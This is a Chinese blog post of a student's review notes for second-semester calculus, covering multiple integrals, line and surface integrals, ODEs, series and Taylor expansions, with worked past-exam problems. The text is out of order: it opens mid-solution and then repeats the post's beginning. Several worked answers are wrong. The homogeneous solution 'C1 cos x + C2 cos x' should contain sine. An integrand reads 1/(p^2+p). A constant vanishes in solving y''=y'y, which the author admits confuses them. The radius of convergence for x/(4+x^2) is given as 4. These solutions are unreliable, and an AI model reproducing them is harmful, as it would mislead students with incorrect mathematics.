，得\n$$\nI=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^1\\mathrm{d}r\\int_0^1\\frac{r}{\\sqrt{2}}dz=\\frac{\\pi}{\\sqrt2}\n$$\n> 直角坐标与柱面坐标关系：\n$$\n\\left\\\\{\n\\begin{aligned}\nx&=r\\cos\\theta \\\\\\\\\ny&=r\\sin\\theta \\\\\\\\\nz&=z\n\\end{aligned}\n\\right.\n$$\n此时 $\\mathrm{d}V=r\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}z$\n直角坐标与球面坐标关系：\n$$\n\\left\\\\{\n\\begin{aligned}\nx&=r\\sin\\varphi\\cos\\theta \\\\\\\\\ny&=r\\sin\\varphi\\sin\\theta \\\\\\\\\nz&=r\\cos\\varphi\n\\end{aligned}\n\\right.\n$$\n此时 $\\mathrm{d}V=r^2\\sin\\varphi\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}\\varphi$\n\n**斯托克斯公式**：\n$$\n∮_L P\\mathrm{d}x+Q\\mathrm{d}y+R\\mathrm{d}z=\\iint \\limits_\\Sigma\n\\begin{vmatrix}\n\\mathrm{d}y\\mathrm{d}z & \\mathrm{d}x\\mathrm{d}z & \\mathrm{d}x\\mathrm{d}y \\\\\\\\\n\\frac{\\partial}{\\partial x} & \\frac{\\partial}{\\partial y} & \\frac{\\partial}{\\partial z} \\\\\\\\\nP & Q & R\n\\end{vmatrix}=\n\\iint \\limits_\\Sigma\n\\begin{vmatrix}\n\\mathrm{cos}\\alpha & \\mathrm{cos}\\beta & \\mathrm{cos}\\gamma \\\\\\\\\n\\frac{\\partial}{\\partial x} & \\frac{\\partial}{\\partial y} & \\frac{\\partial}{\\partial z} \\\\\\\\\nP & Q & R\n\\end{vmatrix}\n\\mathrm{d}S\n$$\n\n### 第九章 常微分方程\n\n#### 1. 基本概念\n\n所谓常微分方程，就是区别于偏微分方程，未知函数是**一元函数**，而不是多元。\n常微分方程的阶数即肉眼可见的导数的最高阶，如 $y'''+2(y'')^3+y^2+x^5$ 就是三阶常微分方程。\n**通解**的概念：$n$ 阶常微分方程有解 $y=\\varphi(x;C_1,\\cdots,C_n)$ ，其中 $C_1,\\cdots,C_n$ 是 $n$ 个独立的任意常数，则称其为方程的一个通解；相对的，就有特解的概念，即方程的任何一个不包含任意常数的解。用数学语言表达独立性，有雅可比行列式不为零，即\n$$\n\\frac{D(\\varphi,\\varphi',\\cdots,\\varphi^{n-1})}{D(C_1,C_2,\\cdots,C_n)}\\ne0\n$$\n\n举个例子，经典方程 $y''+y=0$ 有解 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ ，则雅可比行列式为\n$$\n\\frac{D(y,y')}{D(C_1,C_2)}=\n\\begin{vmatrix}\n\\mathrm{sin}x & \\mathrm{cos}x \\\\\\\\\n\\mathrm{cos}x & -\\mathrm{sin}x\n\\end{vmatrix}\n=-1 \\ne 0\n$$\n可能你会问这个雅可比行列式具体怎么出來的，其实第一行就是 $y$ 分别对 $C_1$ 和 $C_2$ 求导，第二行是 $y'$ 对 $C_1$ 和 $C_2$ 求导。\n故 $C_1,C_2$ 是两个独立的任意常数，进而 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ 是方程的通解。\n\n#### 2. 初等积分法\n\n##### 2.1 变量分离的方程\n\n##### 2.2 可化为变量分离的几类方程\n\n##### 2.3 一阶线性微分方程\n\n形如\n$$\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)\n$$\n的一阶微分方程就叫一阶线性微分方程。\n一般套公式就行，若 $Q(x)\\equiv0$ ，则为齐次方程，直接积分有通解 $y=C\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}$ ；若为非齐次方程则用**常数变易法**求得通解\n$$\ny=\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}\\left[\\int Q(x)\\mathrm{e}^{\\int P(x)\\mathrm{d}x}dx+C\\right]\n$$\n然后还有**贝努里方程**（当然贝努利方程也是它，音译嘛）长这样：\n$$\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)y^n\\ (n\\ne0,1)\n$$\n作变量代换 $z=y^{1-n}$ ，可化为一阶线性方程\n$$\n\\frac{\\mathrm{d}z}{\\mathrm{d}x}+(1-n)P(x)z=(1-n)Q(x)\n$$\n\n##### 2.4 全微分方程与积分因子\n\n**例**（2021-2022第二学期期末，4）求微分方程 $x\\mathrm{d}y+(y+x^2)\\mathrm{d}x=0$ 的通解。\n**解** $\\frac{\\partial P}{\\partial y}=1=\\frac{\\partial Q}{\\partial x}$，且它们在全平面上连续，故方程为全微分方程。下求原函数 $u(x,y)$ ，由 $\\frac{\\partial u}{\\partial x}=P(x,y)=y+x^2$ ，对 $x$ 积分得\n$$\nu(x,y)=xy+\\frac{x^3}{3}+\\varphi(y)\n$$\n上式对 $y$ 求偏导得\n$$\n\\frac{\\partial u}{\\partial y}=x+\\varphi'(y)\n$$\n另一方面，\n$$\n\\frac{\\partial u}{\\partial y}=Q(x,y)=x\n$$\n比较上两式得 $\\varphi'(y)=0$ ，因而 $\\varphi(y)=0$（这里省略积分常数，不影响后面的通积分表达式），故原函数为 $u(x,y)=xy+\\frac{x^3}{3}$ ，故方程的通解为\n$$\nxy+\\frac{x^3}{3}=C\n$$\n其中 $C$ 为任意常数。\n> 微分方程的通解也叫通积分\n\n##### 2.5 可降阶的二阶微分方程\n\n**例**（2021-2022第二学期期末，5）求微分方程 $y''=y'\\cdot y$ 的通解。\n**解** 方程中不显含变量 $x$ ，令 $p=y'$ ，并将 $y$ 看作自变量，有 $y''=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有\n$$\np\\frac{\\mathrm{d}p}{\\mathrm{d}y}=p\\cdot y\n$$\n若 $p=y'=0$ ，则通解为 $y=C$ ，若 $p\\ne0$ ，则有\n$$\n\\begin{aligned}\n\\frac{\\mathrm{d}p}{\\mathrm{d}y}&=y \\\\\\\\\n\\int\\mathrm{d}p&=\\int y\\mathrm{d}y \\\\\\\\\np&=\\frac{1}{2}y^2+C_1\n\\end{aligned}\n$$\n即 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=\\frac{1}{2}y^2+C_1$ ，再次分离分量，有\n$$\n\\begin{aligned}\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}&=\\frac{1}{2}y^2+C_1 \\\\\\\\\n\\int\\frac{2}{y^2}\\mathrm{d}y&=\\int\\mathrm{d}x + C_2 \\\\\\\\\n-\\frac{2}{y}&=x+C_3 \\\\\\\\\ny&=-\\frac{2}{x}+C\n\\end{aligned}\n$$\n> 这里面的常量 $C$ 变得我也很迷糊，但是结果代进去是对的，就先这样吧（）\n\n**例**（2020-2021第二学期期末，5）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}=(\\frac{\\mathrm{d}y}{\\mathrm{d}x})^3+\\frac{\\mathrm{d}y}{\\mathrm{d}x}$ 的通解。\n**解** 令 $p=y'$ ，有 $y''=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有\n$$\np\\frac{\\mathrm{d}p}{\\mathrm{d}y}=(p^3+p) \\\\\\\\\n\\frac{1}{p^2+p}\\mathrm{d}p=\\mathrm{d}y \\\\\\\\\n\\arctan p=y+C_1\n$$\n即有 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=p=\\tan(y+C_1)$ ，再次分离分量，有\n$$\n\\frac{\\mathrm{d}y}{\\tan(y+C_1)}=\\mathrm{d}x \\\\\\\\\n\\ln\\sin(y+C_1)=x+C_2\n$$\n最终得出 $y=\\arcsin e^{x+C_2}-C_1$\n\n#### 3. 微分方程解的存在唯一性定理\n\n#### 4. 高阶线性微分方程\n\n#### 5. 二阶线性常系数微分方程\n\n特征根 | 通解形式\n---------|----------\n两相异实根 $\\lambda_1,\\lambda_2$ | $C_1e^{\\lambda_1x}+C_2e^{\\lambda_2x}$\n二重根 $\\lambda_1$ | $(C_1+C_2x)e^{\\lambda_1x}$\n共轭复根 $\\lambda_{1,2}=\\alpha\\pm\\mathrm{i}\\beta$ | $e^{\\alpha x}(C_1\\cos\\beta x+C_2\\sin\\beta x)$\n\n$f(x)$ 的形式 | 条件 | 特解的形式\n---------|----------|---------\n$P_n(x)$ | “0”不是/是单/是重特征根 | $Q_n(x)/xQ_n(x)/x^2Q_n(x)$\n$ae^{\\alpha x}$ | $\\alpha$ 不是/是单/是重特征根 | $Ae^{\\alpha x}/Axe^{\\alpha x}/Ax^2e^{\\alpha x}$\n$a\\cos\\beta x+b\\sin\\beta x$ | $\\pm\\mathrm{i}\\beta$ 不是/是特征根 | $A\\cos\\beta x+B\\sin\\beta x/x(A\\cos\\beta x+B\\sin\\beta x)$\n$P_n(x)e^{\\alpha x}$ | $\\alpha$ 不是/是单/是重特征根 | $Q_n(x)e^{\\alpha x}/xQ_n(x)e^{\\alpha x}/x^2Q_n(x)e^{\\alpha x}$\n$P_n(x)e^{\\alpha x}(a\\cos\\beta x+b\\sin\\beta x)$ | $\\alpha\\pm\\mathrm{i}\\beta$ 不是/是特征根 | $e^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]/xe^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]$\n\n咋一看很多，其实挺有规律，比如多一个根就多乘一个 $x$ ，原来的系数变成待定的。\n\n**例**（2021-2022第二学期期末，6）求微分方程 $y''+y=e^{3x}(x+2)$ 的通解。\n**解** 先求对应齐次微分方程 $y''+y=0$ 的通解，特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故通解形式为\n$$\ny(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x\n$$\n其中 $C_1,C_2$ 为任意常数\n再用待定系数法求特解，“3“不是特征根，故设方程有特解 $y=(Ax+B)e^{3x}$ ，则\n$$\n\\begin{aligned}\ny'&=Ae^{3x}+3(Ax+B)e^{3x} \\\\\\\\\ny''&=3Ae^{3x}+3Ae^{3x}+9(Ax+B)e^{3x}=(9Ax+6A+9B)e^{3x} \\\\\\\\\n\\end{aligned}\n$$\n回代得\n$$\ny''+y=(10Ax+6A+10B)e^{3x}=e^{3x}(x+2)\n$$\n解得 $A=\\frac{1}{10},\\ B=\\frac{7}{50}$ ，故特解为 $y=(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$ ，与齐次方程通解相加，得出所求非齐次方程通解为\n$$\ny(x)=C_1\\cos x+C_2\\cos x+(\\frac{1}{10}x+\\frac{7}{50})e^{3x}\n$$\n其中 $C_1,C_2$ 为任意常数。\n\n**例**（2020-2021第二学期期末，6）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}+y=e^x+\\cos x$ 的通解。\n**解** 特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故齐次方程通解形式为\n$$\ny(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x\n$$\n这个方程的非齐次项由两项组成，就先分别求两项的特解，再相加，就是原方程的特解。\n对方程 $y''+y=e^x$ 不难求得特解 $y=\\frac{1}{2}e^x$ ，方程 $y''+y=\\cos x$ 的特解 $y=\\frac{1}{2}x\\cos x$ ，故原方程的特解为\n$$\ny=\\frac{1}{2}(e^x+x\\cos x)\n$$\n与齐次方程通解相加，得出所求非齐次方程通解为\n$$\ny(x)=C_1\\cos x+C_2\\cos x+\\frac{1}{2}(e^x+x\\cos x)\n$$\n\n#### 6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\n\n#### 7. 常系数线性微分方程组\n\n### 第十章 无穷级数\n\n#### 1. 柯西收敛原理与数项级数的概念\n\n#### 2. 正项级数的收敛判别法\n\n1. 比较审敛法\n比收敛小的就收敛，比发散大的就发散\n2. 比值审敛法\n$\\lim\\limits_{n\\to\\infty}\\frac{u_{n+1}}{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定\n3. 根值审敛法\n与上面类似，$\\lim\\limits_{n\\to\\infty}\\sqrt[n]{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定\n4. 对数审敛法\n\n**例**（2021-2022第二学期期末，10-1）判断数项级数 $\\sum\\limits_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})$ 的敛散性。\n**解** 放缩一下再比较判别法\n$$\n\\sum_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})<\\sum_{n=1}^{\\infty}3^n(\\frac{\\pi}{4^n})=\\pi\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n\n$$\n由于 $\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$ 收敛，故原级数收敛。\n\n#### 3. 任意项级数\n\n**莱布尼茨判别法** 若交错级数满足下列条件：\n$$\n(1)u_n\\geqslant u_{n+1}; \\\\\\\\\n(2)\\lim_{n\\rightarrow\\infty}=0,\n$$\n则级数收敛。\n**狄利克雷判别法** 考虑级数\n$$\n\\sum_{k=1}^{\\infty}a_kb_k\n$$\n若序列 ${a_k}$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，又级数 $\\sum\\limits_{n=1}^{\\infty}b_k$ 的部分和序列有界，则级数 $\\sum\\limits_{k=1}^{\\infty}a_kb_k$ 收敛。\n**例**（2021-2022第二学期期末，10-2）判断数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 的敛散性。\n**解** 取 $a_k=\\frac{1}{\\ln n}$ ，易证得 $a_k$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，下证级数 $\\sum\\limits_{n=2}^{\\infty}\\cos(2n)$ 的部分和序列有界：\n$$\n\\begin{aligned}\n\\left|\\sum_{k=2}^{n}\\cos(2k)\\right|&=\\left|\\cos4+\\cos6+\\cdots+\\cos2n\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\cos4\\sin1+\\cos6\\sin1+\\cdots+\\cos2n\\sin1\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\frac{\\sin5-\\sin3}{2}+\\frac{\\sin7-\\sin5}{2}+\\cdots+\\frac{\\sin(2n+1)-\\sin(2n-1)}{2}\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\frac{\\sin(2n+1)-\\sin3}{2}\\right| \\\\\\\\\n&\\leqslant\\frac{1}{\\sin1}\n\\end{aligned}\n$$\n故级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 收敛。\n> **积化和差公式**\n$$\n{\\displaystyle \\sin \\alpha \\cos \\beta ={\\sin(\\alpha +\\beta )+\\sin(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\cos \\alpha \\sin \\beta ={\\sin(\\alpha +\\beta )-\\sin(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\cos \\alpha \\cos \\beta ={\\cos(\\alpha +\\beta )+\\cos(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\sin \\alpha \\sin \\beta ={\\cos(\\alpha +\\beta )-\\cos(\\alpha -\\beta ) \\over -2}}\n$$\n\n**阿贝尔判别法**\n（1）无穷数列 ${a_k}$ 单调有界\n（2）级数 $\\sum\\limits_{k=1}^\\infty b_k$ 收敛\n则级数 $\\sum\\limits_{k=1}^\\infty a_kb_k$ 收敛。\n\n#### 4. 函数项级数\n\n##### 4.1 函数序列及函数项级数的一致收敛性\n\n##### 4.2 函数项级数一致收敛的必要条件与判别法\n\n**强级数判别法** 若函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 的一般项满足：\n$$\n|u_n(x)|\\leqslant a_n,\\quad \\forall x\\in X,n=1,2,\\cdots,\n$$\n且正项级数 $\\sum\\limits_{n=1}^\\infty a_n$ 收敛，则该函数项级数在 $X$ 上一致收敛。\n\n**狄利克雷判别法** 与数项级数的狄利克雷判别法类似。\n（1）在 $X$ 中任意取定一个 $x$ ，数列 $\\{a_n(x)\\}$ 对 $n$ 单调，且函数序列 $\\{a_n(x)\\}$ 在 $X$ 上一致收敛于 $0$\n（2）函数项级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 的部分和序列 $\\{B_n(x)\\}$ 在 $X$ 上一致有界\n则 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。\n\n**阿贝尔判别法** 与数项级数的阿贝尔判别法类似。\n（1）在 $X$ 中任意取定一个 $x$ ，数列 $\\{a_n(x)\\}$ 单调，又函数序列 $\\{a_n(x)\\}$ 在 $X$ 上一致有界\n（2）级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 在 $X$ 上一致收敛\n则级数 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。\n\n##### 4.3 一致收敛级数的性质\n\n**和函数的连续性** 设函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上一致收敛，且其每一项 $u_n(x)$ 在 $[a,b]$ 上都连续，则其和函数 $S(x)=\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上也连续。\n\n**例**（2021-2022第二学期期末，11）考虑函数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{1}{n^2\\sqrt x}$ ，证明：\n（1）级数在 $(0,1)$ 上收敛\n（2）级数在 $(0,1)$ 上不一致收敛\n（3）级数的和函数 $S(x)$ 在 $(0,1)$ 上连续\n**解** （1）就是数项级数，随便证。\n（2）存在点列 $x_n=\\frac{1}{n^4}\\in(0,1)(n=1,2,\\cdots)$ 使 $u_n(x_n)=1$\n\n#### 5. 幂级数\n\n幂级数是**函数项级数的一种**，长这样：\n$$\na_0+a_1(x-x_0)+a_2(x-x_0)^2+\\cdots+a_n(x-x_0)^n+\\cdots\n$$\n\n##### 5.1 幂级数的收敛半径\n\n$$\n\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_{n+1}}{a_{n}}\\right|=l\n$$\n那么级数 $\\sum\\limits^n_{n=0}a_nx^n$ 的**收敛半径** $R=1/l$ ，当然直接反着除直接出也行。\n**收敛区间**就是 $(-R,R)$ ，**收敛域**就根据端点的收敛情况再修正下区间闭不闭合。\n\n**例**（2021-2022第二学期期末，8）求幂级数 $\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ 的收敛半径与和函数。\n**解**\n$$\n\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_n}{a_{n+1}}\\right|=\\lim_{n\\rightarrow\\infty}\\left|\\frac{n}{n+1}\\right|=1\n$$\n故收敛半径 $R=1$ ，收敛区间 $(-1,1)$ 。\n然后讨论两个端点，当 $x=1$ 时，原级数发散；当 $x=-1$ 时，原级数收敛，故收敛域为 $[-1,1)$\n设和函数 $S(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ ，则两边乘 $x$ 有 $xS(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^{n+1}$ ，两边求导有\n$$\n\\left[xS(x)\\right]'=\\sum\\limits^\\infty_{n=0}x^n=\\frac{1}{1-x}\n$$\n再两边求积，有\n$$\nxS(x)=\\int^x_0\\frac{1}{1-x}\\mathrm{d}x=-\\ln(1-x),\\ x\\in[-1,1)\n$$\n故当 $x\\ne0$ 时，$S(x)=-\\frac{1}{x}\\ln(1-x)$ ；当 $x=0$ 时，肉眼可见 $S(x)=1$ 。\n> 这里有个小 trick ，就是**幂级数里认定 $0^0=1$** ，至于为什么是这样，网上众说纷纭，读者可自行查阅。\n\n##### 5.2 幂级数的性质\n\n和函数项级数一样，可以逐项求积，也可以逐项求导。\n\n#### 6. 泰勒级数\n\n求函数在 $x=k$ 处的泰勒展开式就作 $t=x-k$ 变换，然后求出来的式子再代回去就行了。\n\n记一下常用的几条泰勒展开式：\n$$\n\\frac{1}{1-x}=1+x+x^2+x^3+\\cdots+x^n+\\cdots,\\ x\\in(-1,1)\\\\\\\\\ne^x=1+x+\\frac{x^2}{2!}+\\frac{x^3}{3!}+\\cdots+\\frac{x^n}{n!}+\\cdots\\\\\\\\\n\\sin x=x-\\frac{x^3}{3!}+\\frac{x^5}{5!}-\\frac{x^7}{7!}+\\cdots+(-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!}+\\cdots\\\\\\\\\n\\cos x=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}-\\frac{x^6}{6!}+\\cdots+(-1)^{n}\\frac{x^{2n}}{(2n)!}+\\cdots\\\\\\\\\n\\arctan x=x-\\frac{x^3}{3}+\\frac{x^5}{5}-\\frac{x^7}{7}+\\cdots+(-1)^{n}\\frac{x^{2n+1}}{(2n+1)}+\\cdots\\\\\\\\\n\\ln(1+x)=x-\\frac{x^2}{2}+\\frac{x^3}{3}-\\frac{x^4}{4}+\\cdots+(-1)^{n-1}\\frac{x^n}{n}+\\cdots\\\\\\\\\n(1+x)^\\alpha=1+\\alpha x+\\frac{\\alpha(\\alpha-1)}{2!}x^2+\\frac{\\alpha(\\alpha-1)(\\alpha-2)}{3!}x^3+\\cdots+\\frac{\\alpha(\\alpha-1)(\\alpha-2)\\cdots(\\alpha-n+1)}{n!}x^n+R_n(x)\n$$\n关于最后这个 $R_n(x)$ ，一堆证明后得出，当 $x\\in (-1,1)$ 时有 $\\lim\\limits_{n\\rightarrow \\infty}=0$\n\n**例**（2021-2022第二学期期末，10）求函数 $y=\\frac{x}{4+x^2}$ 在 $x=0$ 处的泰勒级数，并指出其收敛域。\n**解** $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，右边显然就是 $\\arctan x$ 导数的形式了，故我们由 $\\arctan x$ 的泰勒展开式逐项求导有\n$$\n\\frac{1}{1+x^2}=(\\arctan x)'=1-x^2+x^4-x^6+\\cdots+(-1)^{n}x^{2n}+\\cdots\n$$\n变形得\n$$\n\\frac{1}{1+(\\frac{x}{2})^2}=1-\\frac{x^2}{4}+\\frac{x^4}{16}-\\frac{x^6}{64}+\\cdots+(-1)^{n}\\frac{x^{2n}}{2^{2n}}+\\cdots\n$$\n最后代入 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，有\n$$\ny=\\frac{x}{4}-\\frac{x^3}{16}+\\frac{x^5}{64}-\\frac{x^7}{256}+\\cdots+(-1)^n\\frac{x^{2n+1}}{2^{2n+2}}+\\cdots\n$$\n那么级数形式为\n$$\ny=\\sum\\limits^\\infty_{n=0}\\frac{(-1)^n}{4^{n+1}}x^{2n+1}\n$$\n收敛半径 $R=\\lim\\limits_{n\\rightarrow\\infty}\\left|\\frac{(-1)^{n}}{4^{n+1}}\\cdot\\frac{4^{n+2}}{(-1)^{n+1}}\\right|=4$\n故收敛区间为 $(-4,4)$ ，当 $x=-4$ 时，\n","source":"_posts/高数下笔记.md","raw":"---\ntitle: 高数下笔记\ndate: 2022-08-07 19:50:00\ntags: [数学,高数]\ncategories: 学习\n---\n\n挂科了，还是要学好高数啊！\n<!--more-->\n\n## 前言\n\n玩脱了，光顾着搞技术，绩点炸了。\n高数 59 ，有人问我说我是不是得罪老师了——但是有没有一种可能，就是。。平时分已经给满了（）\n\n## 笔记正文\n\n### 第六章 多元函数微分学\n\n#### 1. 多元函数\n\n#### 2. 多元函数的极限\n\n#### 3. 多元函数的连续性\n\n#### 4. 偏导数与全微分\n\n**例**（2020-2021第二学期期末，1）确定实数 $\\alpha$ 的范围，使函数 $f(x,y)=\\left\\\\{\n\\begin{aligned}\n    (x^2+y^2)^\\alpha\\sin\\frac{1}{x^2+y^2},x^2+y^2\\neq0 \\\\\\\\\n    0,x^2+y^2\\neq0\n\\end{aligned}\n\\right.$ 在 $(0,0)$ 处可微。\n**解**\n$$\n\\lim_{x\\rightarrow0}\\frac{f(x,0)-f(0,0)}{x-0}=\\lim_{x\\rightarrow0}\\frac{x^{2\\alpha}\\sin\\frac{1}{x^2}}{x}=\\lim_{x\\rightarrow0}x^{2\\alpha-1}\\sin\\frac{1}{x^2}\n$$\n当 $2\\alpha-1>0$ 时，极限为 $0$ ，即 $f_x'(0,0)=0$ ，此时类似地，有 $f_y'(0,0)=0$\n\n#### 5. 复合函数与隐函数的微分法\n\n#### 6. 方向导数与梯度\n\n#### 7. 多元函数的微分中值定理与泰勒公式\n\n#### 8. 隐函数存在定理\n\n#### 9. 极值问题\n\n先用 $f_x'=f_y'=0$ 求出稳定点，再令 $A=f_{xx},B=f_{xy},C=f_{yy}$ ，仅 $B^2 < AC$ 时可以确定极值，此时 $A>0$ 就是极小值， $A < 0$ 就是极大值。与二元函数类似。\n\n**例**（2021-2022第二学期期末，4）求多元函数 $f(x,y)=xe^{-\\frac{x^2+y^2}{2}}$ 的极值。\n**解** $f_x'=e^{-\\frac{x^2+y^2}{2}}(1-x^2),f_y'=e^{-\\frac{x^2+y^2}{2}}(-xy)$ ，令 $f_x'=f_y'=0$ ，得到 $(-1,0)$ 和 $(1,0)$ 两个稳定点。令 $A=f_{xx}=e^{-\\frac{x^2+y^2}{2}}(x^3-3x),B=f_{xy}=e^{-\\frac{x^2+y^2}{2}}(-y+x^2y),C=f_{yy}=e^{-\\frac{x^2+y^2}{2}}(-x+xy^2)$ ，代入 $(1,0)$ 得到 $A=-2e^{-\\frac{1}{2}}<0$，$B=0$\n\n### 第七章 重积分\n\n#### 1. 二重积分的概念与性质\n\n#### 2. 二重积分的计算\n\n**例**（2021-2022第二学期期末，2）求 $I=\\int_0^1\\mathrm{d}x\\int_0^{\\sqrt{1-x^2}}(x^2+y^2)\\mathrm{d}y$\n**解** 作极坐标变换 $x=r\\cos\\theta,y=r\\sin\\theta$，则\n$$\nI = \\int_0^{\\frac{\\pi}{4}}\\mathrm{d}\\theta\\int_0^1 r\\cdot r\\mathrm{d}r = \\frac{\\pi}{12}\n$$\n**例**（2017-2018第二学期期末，1）计算二重积分 $\\iint_D\\frac{|y|}{x^2+y^2}\\mathrm{d}x\\mathrm{d}y$，其中 $D$ 为圆环区域 $1\\leq x^2+y^2\\leq 4$。\n**解** 作极坐标变换，有\n$$\nI = \\int_0^{2\\pi}\\mathrm{d}\\theta\\int_1^2 \\frac{|r\\sin\\theta|}{r^2}\\cdot\\mathrm{d}r = \\int_0^{2\\pi}|\\sin\\theta|\\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\\int_0^{\\frac{\\pi}{2}}\\sin\\theta \\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\n$$\n\n#### 3. 三重积分的概念与计算\n\n#### 4. 重积分的应用举例\n\n曲面 $S$ 由参数方程 $x=x(u,v),y=y(u,v),z=z(u,v), (u,v)\\in D'$ 给出时，可计算\n$$\nE = x_u^2+y_u^2+z_u^2 \\\\\\\\\nF = x_ux_v+y_ux_v+z_ux_v \\\\\\\\\nG = x_v^2+y_v^2+z_v^2\n$$\n从而\n$$\nS = \\iint\\limits_{D'}\\sqrt{EG-F^2}\\mathrm{d}u\\mathrm{d}v\n$$\n\n### 第八章 曲线积分与曲面积分\n\n#### 1. 第一型曲线积分（对弧长的曲线积分）\n\n这个非常地简单直观，就是求一条曲线（如二次函数的某一段）的长度。\n平面曲线求法：\n$$\n\\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x(t),y(t)]\\sqrt{[x'(t)]^2+[y'(t)]^2}dt \\\\\\\\\nor \\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x,y(x)]\\sqrt{[1+[y'(x)]^2}dxdy\n$$\n空间曲线类似：\n$$\n\\int_Lf(x,y,z)ds=\\int_\\alpha^\\beta f[x(t),y(t),z(t)]\\sqrt{[x'(t)]^2+[y'(t)]^2+[z'(t)]^2}dt \\\\\\\\\n$$\n\n#### 2. 第二型曲线积分（对坐标的曲线积分）\n\n这个看起来就不那么地直观，其物理背景是求变力在曲线上做功，大概想象一下子。\n计算方法：\n$$\n\\int_{\\overset{\\frown}{AB}}P(x,y)dx=\\int_\\alpha^\\beta P[x(t),y(t)]x'(t)dt \\\\\\\\\n\\int_{\\overset{\\frown}{AB}}Q(x,y)dy=\\int_\\alpha^\\beta Q[x(t),y(t)]y'(t)dt\n$$\n两类曲线积分关系：\n$$\n\\int_LPdx+Qdy=\\int_L(Pcos\\alpha +Qcos\\beta )ds \\\\\\\\\nor \\int_\\Gamma Pdx+Qdy+Rdz=\\int_L(Pcos\\alpha +Qcos\\beta +Rcos\\gamma )ds\n$$\n\n#### 3. 格林公式\n\n就一道式子：\n$$\n∮_L Pdx+Qdy=∬\\limits_D( \\frac{ \\partial Q }{ \\partial x }- \\frac{ \\partial P }{ \\partial y })dxdy\\\\\\\\\n$$\n条件是函数 $P$ 和 $Q$ 在平面区域 $D$ 上有连续的偏导数 ~~，这个条件一般不管，~~ 主要是**边界曲线 $L$ 闭合**就行。\n格林公式可以将**第二类曲线积分**化为简单的二重积分，非常地不错。\n> PS:以下这些符号的 Latex 支持不是很好，直接用字符了。\n$$\n∮ \\ ∯ \\ ∰ \\ ∱ \\ ∲ \\ ∳\n$$\n\n**例**（2020-2021第二学期期末，2）计算曲线积分 $∮_L(xy^2-\\sin y)\\mathrm{d}y-(\\cos x+x^2y)\\mathrm{d}x$ ，其中 $L$ 为圆周 $x^2+y^2=4$ ，积分方向为沿 $L$ 逆时针方向。\n**解** $L$ 为闭合曲线，且 $P,Q$ 在 $L$ 围成的 $D$ 上偏导也连续，所以可以用格林公式：\n$$\n\\begin{aligned}\nI&=\\iint\\limits_D[y^2-(-x^2)]\\mathrm{d}x\\mathrm{d}y 